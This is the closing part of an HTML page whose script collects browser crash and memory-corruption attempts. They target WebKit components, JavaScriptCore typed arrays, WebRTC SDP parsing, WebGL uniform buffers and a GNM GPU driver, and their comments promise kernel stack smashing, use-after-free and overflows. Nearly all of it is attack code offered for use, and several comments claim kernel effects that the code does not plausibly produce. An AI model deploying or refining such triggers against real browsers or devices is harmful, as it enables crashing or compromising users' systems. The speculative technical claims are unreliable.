            // Creating channels is fast, but kernel allocation lags behind
            channels.push(pc.createDataChannel("chk" + i, {
                ordered: true,
                maxRetransmits: 0
            }));
            
            if (i % 1000 === 0) {
                // Periodically close some to fragment the ID space
                channels[0].close();
                channels.shift();
            }
        }
        
        // Trigger negotiation which pushes this configuration to the kernel
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
    } catch(e) {
        // If JS fails, we might have already corrupted kernel state
    }
}


     
function crashBlobRecursionStack() {
    // Vector: Recursive Blob Construction
    // Target: Kernel VFS / Memory Manager
    // Logic: Nesting Blobs creates a linked list of references in the Kernel. 
    // Reading a deeply nested blob forces recursive resolution, smashing the Kernel Stack.
    
    const depth = 5000;
    let blobs = [new Blob(["base"])];
    
    // Create a deeply nested structure: Blob(Blob(Blob(...)))
    try {
        for (let i = 0; i < depth; i++) {
            // New blob containing reference to previous blob
            // This builds a huge reference chain in the VFS layer
            const newBlob = new Blob([blobs[blobs.length - 1]], { type: 'application/octet-stream' });
            blobs.push(newBlob);
        }
        
        // Trigger: Attempt to read the tip of the iceberg
        // The kernel must traverse all 5000 layers to find the data.
        const url = URL.createObjectURL(blobs[blobs.length - 1]);
        const xhr = new XMLHttpRequest();
        xhr.open('GET', url);
        xhr.send();
        
        // Cleanup attempt to confuse reference counting during read
        setTimeout(() => {
            blobs = null;
            URL.revokeObjectURL(url);
        }, 1);
        
    } catch(e) {}
}

function crashWebGLUniformBuffer() {
    // Vector: Uniform Buffer Offset Wraparound
    // Target: GNM Driver (GPU)
    // Logic: Binding a Uniform Buffer with an offset that causes 32-bit integer wrap-around.
    // This points the GPU to read from invalid memory addresses (kernel space).
    
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl2');
    if (!gl) return;
    
    const ubo = gl.createBuffer();
    gl.bindBuffer(gl.UNIFORM_BUFFER, ubo);
    // Allocate normal size
    gl.bufferData(gl.UNIFORM_BUFFER, 1024, gl.DYNAMIC_DRAW);
    
    // The Program
    const vs = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs, `#version 300 es
    layout(std140) uniform Block { vec4 val; };
    void main() { gl_Position = val; }`);
    gl.compileShader(vs);
    const fs = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs, `#version 300 es
    precision mediump float; out vec4 c; void main() { c = vec4(1.0); }`);
    gl.compileShader(fs);
    const prog = gl.createProgram();
    gl.attachShader(prog, vs);
    gl.attachShader(prog, fs);
    gl.linkProgram(prog);
    gl.useProgram(prog);
    
    const blockIndex = gl.getUniformBlockIndex(prog, "Block");
    gl.uniformBlockBinding(prog, blockIndex, 0);
    
    // TRIGGER: Bind with offset close to MAX_UINT. 
    // GPU Addr = Base + Offset. If Base + Offset overflows, it wraps to 0x0 or Kernel RAM.
    const offset = 0xFFFFFFF0; // Must be aligned usually, but driver might fail check
    try {
        // Range: bind offset + size. 
        gl.bindBufferRange(gl.UNIFORM_BUFFER, 0, ubo, offset, 16);
        gl.drawArrays(gl.POINTS, 0, 1);
        gl.finish();
    } catch(e) {}
}

function crashHistoryStateObject() {
    // Vector: History State Serialization Mutator
    // Target: SerializedScriptValue (WebCore)
    // Logic: pushState serializes the object. We pass an object with a getter.
    // The getter navigates the page (location.href) mid-serialization, destroying the Document context.
    
    const evilState = {
        get boom() {
            // Mutate state during cloning
            // This destroys the context SerializedScriptValue is working in
            try {
                window.location.reload(); 
                // Or try to navigate iframe
                const f = document.createElement('iframe');
                document.body.appendChild(f);
                f.contentWindow.location.reload();
            } catch(e) {}
            
            // Return large object to force memory alloc
            return new Array(10000).fill("A");
        }
    };
    
    // Deeply nest to ensure getter is called deep in the stack
    const deep = { nested: { nested2: evilState } };
    
    try {
        // history.pushState uses Structured Clone Algorithm
        history.pushState(deep, "Crash", "?crash");
    } catch(e) {}
}

function crashCanvasPatternCycle() {
    // Vector: Canvas Pattern Recursion
    // Target: 2D Graphics Context (Cairo/Skia backend logic)
    // Logic: Create a cycle where Canvas A uses a Pattern from Canvas B, 
    // and Canvas B uses a Pattern from Canvas A. Then draw.
    // This creates an infinite recursion in the rendering pipeline.
    
    const c1 = document.createElement('canvas');
    const c2 = document.createElement('canvas');
    const ctx1 = c1.getContext('2d');
    const ctx2 = c2.getContext('2d');
    
    c1.width = 100; c1.height = 100;
    c2.width = 100; c2.height = 100;
    
    // Setup initial state
    ctx1.fillStyle = "red";
    ctx1.fillRect(0,0,100,100);
    
    try {
        // Create Pattern 1 from Canvas 2
        // Note: C2 is empty now, but we will dirty it later
        const p1 = ctx1.createPattern(c2, 'repeat');
        
        // Create Pattern 2 from Canvas 1
        const p2 = ctx2.createPattern(c1, 'repeat');
        
        // Assign cyclic patterns
        ctx1.fillStyle = p1;
        ctx2.fillStyle = p2;
        
        // Trigger the rendering cycle
        // To render C1, it needs P1 (source C2).
        // To render C2, it needs P2 (source C1).
        // Stack Overflow in Render Engine.
        ctx1.fillRect(0, 0, 100, 100);
        ctx2.fillRect(0, 0, 100, 100); // Double trigger
        
    } catch(e) {}
}

function crashPannerNodeRace() {
    // Vector: Audio Panner Model Switch Race
    // Target: Audio DSP Thread
    // Logic: The PannerNode has complex internal logic for HRTF (3D Audio).
    // Switching 'panningModel' requires re-allocating delay lines and convolution buffers.
    // Doing this rapidly while processing audio creates a UAF race in the DSP thread.
    
    if (!window.AudioContext) return;
    const ctx = new AudioContext();
    const osc = ctx.createOscillator();
    const panner = ctx.createPanner();
    
    osc.connect(panner);
    panner.connect(ctx.destination);
    osc.start();
    
    const models = ['equalpower', 'HRTF'];
    let i = 0;
    
    const iv = setInterval(() => {
        try {
            // Rapidly switch models
            // HRTF loads database files (kernel/fs interaction)
            // Equalpower is simple math.
            panner.panningModel = models[i++ % 2];
            
            // Also thrash position to force calculations
            panner.setPosition(Math.random()*10, Math.random()*10, Math.random()*10);
            
            if (i > 500) {
                clearInterval(iv);
                ctx.close();
            }
        } catch(e) {}
    }, 1); // 1ms interval is aggressive for Audio Thread
}

function crashTextTrackCueUAF() {
    // Vector: TextTrackCue Event UAF
    // Target: WebCore::TextTrack
    // Logic: Captions (<track>) fire events. If we remove the track 
    // FROM INSIDE the event handler of a specific cue, the iterator in C++ breaks.
    
    const video = document.createElement('video');
    const track = video.addTextTrack("captions", "Crash", "en");
    track.mode = "showing";
    
    const cue = new VTTCue(0, 1, "Crash Text");
    
    cue.onenter = function() {
        // This fires when video time hits 0
        console.log("Cue entered");
        
        // O GOLPE: Destroy the track list while iterating cues
        // This invalidates the C++ 'track' pointer held by the event dispatcher
        try {
            // Remove the specific cue
            track.removeCue(cue);
            // Disable mode
            track.mode = "disabled";
            // Remove video from DOM to trigger GC
            video.remove();
            
            // Allocate garbage to fill the freed memory
            const filler = new Array(1000).fill(1.1);
        } catch(e) {}
    };
    
    track.addCue(cue);
    document.body.appendChild(video);
    
    // Trigger playback to hit the cue timestamp
    // We don't need real video data, just the time ticker
    try {
        video.currentTime = 0; // Reset
        video.play().catch(e=>{}); // Start logic
    } catch(e) {}
}

function crashGamepadPollution() {
    // Vector: Gamepad Prototype Pollution
    // Target: Gamepad API / Kernel Input Driver
    // Logic: Pollute the Gamepad prototype. When navigator.getGamepads() is called,
    // the native code wraps kernel structures into JS Objects.
    // If the prototype setters throw or mutate state, the native wrapper logic fails.
    
    if (!navigator.getGamepads) return;
    
    // Poison the prototype
    try {
        const pads = navigator.getGamepads();
        if (pads && pads.length > 0 && pads[0]) {
            const proto = Object.getPrototypeOf(pads[0]);
            
            // Poison 'axes' property
            Object.defineProperty(proto, 'axes', {
                get: function() {
                    // This runs when code tries to read axes
                    // Force a garbage collection or state change here
                    const x = new ArrayBuffer(1024 * 1024);
                    return [0.0, 0.0, 0.0, NaN]; // Return bad data
                }
            });
        }
    } catch(e) {}
    
    // Polling loop to force kernel interaction using poisoned objects
    const iv = setInterval(() => {
        const list = navigator.getGamepads();
        for(let i=0; i<list.length; i++) {
            if(list[i]) {
                const axes = list[i].axes; // Trigger poison
            }
        }
    }, 16);
    
    setTimeout(() => clearInterval(iv), 2000);
}

function crashSDPCodecOverflow() {
    // Vector: WebRTC SDP Codec Overflow
    // Target: SIP/SDP Parser (Kernel/Lib)
    // Logic: Creating an SDP with an insanely long 'fmtp' (Format Parameter) line.
    // The parser copies this line into a fixed-size stack buffer.
    
    if (!window.RTCPeerConnection) return;
    const pc = new RTCPeerConnection();
    
    // Start with valid header
    let sdp = "v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\ns=-\r\nt=0 0\r\n";
    sdp += "m=audio 1234 RTP/AVP 100\r\n";
    
    // Generate overflow string (100KB of 'A')
    const overflow = "A".repeat(100000);
    
    // 'a=fmtp' line defines codec parameters. 
    // Parsers often read this line until newline into a buffer.
    sdp += "a=rtpmap:100 OPUS/48000/2\r\n";
    sdp += "a=fmtp:100 minptime=10;useinbandfec=1; " + overflow + "\r\n";
    
    const desc = { type: 'offer', sdp: sdp };
    
    try {
        // setRemoteDescription parses the SDP string
        // This happens in C++ immediately
        pc.setRemoteDescription(desc)
          .then(() => {})
          .catch(e => {});
    } catch(e) {}
}

function crashNodeInsertionRecursion() {
    // Vector: DOM Insertion Recursion
    // Target: WebCore DOM Tree Mutator
    // Logic: 'DOMNodeInserted' fires when a node is added. 
    // If the handler adds the SAME node to a NEW parent, it triggers the event again.
    // This creates an infinite recursion of DOM insertions, exhausting the C++ stack.
    
    const root = document.createElement('div');
    const child = document.createElement('span');
    
    let depth = 0;
    
    // Add listener to 'root' (bubbles) or 'child'
    document.addEventListener('DOMNodeInserted', function(e) {
        if (e.target === child) {
            depth++;
            if (depth > 200) return; // Fail-safe (browser might crash before this)
            
            // Create a new container to move the child into
            // This triggers 'DOMNodeInserted' again synchronously
            const newParent = document.createElement('div');
            try {
                newParent.appendChild(child);
            } catch(ex) {}
        }
    });
    
    // Trigger the chain reaction
    root.appendChild(child);
}

function crashTypedArraySetOverlap() {
    // Vector: TypedArray.set Overlapping Detach
    // Target: JSC TypedArray::set
    // Logic: typedArray.set(source) handles overlap copies.
    // If 'source' is a view on the SAME buffer, but we detach it mid-copy via a getter...
    
    const buffer = new ArrayBuffer(1024);
    const dest = new Uint8Array(buffer);
    const src = new Uint8Array(buffer); // Overlapping view
    
    // Worker to handle detach
    const w = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
    
    // Use a proxy-like approach or getters if possible to detect access
    // Or just brute force race condition
    
    const killer = setInterval(() => {
        // Attempt to detach buffer constantly
        w.postMessage(buffer, [buffer]);
    }, 0);
    
    try {
        for(let i=0; i<10000; i++) {
            // .set() performs memmove internally.
            // If buffer is detached during memmove setup, pointers become invalid (NULL or garbage)
            dest.set(src);
        }
    } catch(e) {}
    
    clearInterval(killer);
}
  
    </script>
</body>
</html>





